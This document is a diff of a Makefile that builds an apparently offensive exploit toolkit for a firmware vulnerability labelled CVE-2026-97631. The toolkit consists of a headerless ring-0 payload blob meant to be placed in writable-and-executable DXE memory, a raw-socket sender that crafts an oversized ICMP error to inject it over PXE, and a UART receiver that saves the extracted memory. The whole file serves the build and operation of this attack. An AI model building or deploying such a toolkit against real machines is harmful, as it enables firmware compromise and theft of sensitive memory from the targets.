@@ -1,15 +1,17 @@
-# Makefile - CVE-2026-97631 DXE memory dumper
+# Makefile - CVE-2026-97631 DXE memory reader
 #
-# Targets
-#   payload.bin   position-independent ring-0 blob, .rodata-ready
-#   pxeinj        sender (crafts the oversized ICMP error)
-#   pxerecv       UART sink -> extraction file
-#   fw_offsets    parses a debug firmware map to produce real graft offsets
+# Linux host: build and run everything.
+#   make                        payload.bin, pxeinj, pxerecv
+#   make build/payload.bin      just the ring-0 blob
 #
-# Cross usage (Linux host, gcc + binutils) is the normal case:
-#   make payload.bin CC=gcc LD=ld OBJCOPY=objcopy
+# Windows host: the simulator only, via Makefile.win.
+#
+# The sender and receiver are POSIX (AF_PACKET, IP_HDRINCL, termios) and are
+# not expected to build on Windows; MSVC cannot compile them. The transmitter
+# runs on the segment with the target, the simulator runs on the analysis
+# machine.
 
-CC      ?= gcc
+CC      ?= cc
 LD      ?= ld
 OBJCOPY ?= objcopy
 CFLAGS  ?= -O2 -Wall -Wextra -Wno-unused-parameter -std=c11
@@ -18,14 +20,14 @@ LDFLAGS ?=
 
 BIN := build
 
-all: $(BIN)/payload.bin $(BIN)/pxeinj $(BIN)/pxerecv $(BIN)/fw_offsets
+all: $(BIN)/payload.bin $(BIN)/pxeinj $(BIN)/pxerecv
 
 $(BIN):
 	@mkdir -p $(BIN)
 
 # ---- ring-0 blob -----------------------------------------------------------
-# Assembled, linked at 0, then only .text extracted: no headers, no relocs,
-# no padding.  The result drops anywhere in DXE code or data pages.
+# Assembled, linked at 0, then only .text extracted: no headers, no relocs, no
+# padding.  Drops anywhere in a writable+executable DXE pool page.
 $(BIN)/payload.o: src/payload.S | $(BIN)
 	$(CC) -c -nostdlib -fPIC -o $@ $<
 
@@ -34,17 +36,14 @@ $(BIN)/payload.elf: $(BIN)/payload.o
 
 $(BIN)/payload.bin: $(BIN)/payload.elf
 	$(OBJCOPY) -O binary --only-section=.text $< $@
-	@echo "payload size: $$(wc -c < $@) bytes"
+	@printf "payload: %s bytes\n" "$$(wc -c < $@)"
 
 # ---- host tools ------------------------------------------------------------
-$(BIN)/pxeinj: src/main.c src/craft.c src/graft.c src/uart.c | $(BIN)
+$(BIN)/pxeinj: src/main.c src/craft.c src/graft.c src/layout.c src/net.c | $(BIN)
 	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
 
-$(BIN)/pxerecv: src/recv.c src/uart.c | $(BIN)
+$(BIN)/pxerecv: src/recv.c | $(BIN)
 	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
-
-$(BIN)/fw_offsets: tools/fw_offsets.py
-	@cp $< $@ && chmod +x $@
 
 clean:
 	rm -rf $(BIN)
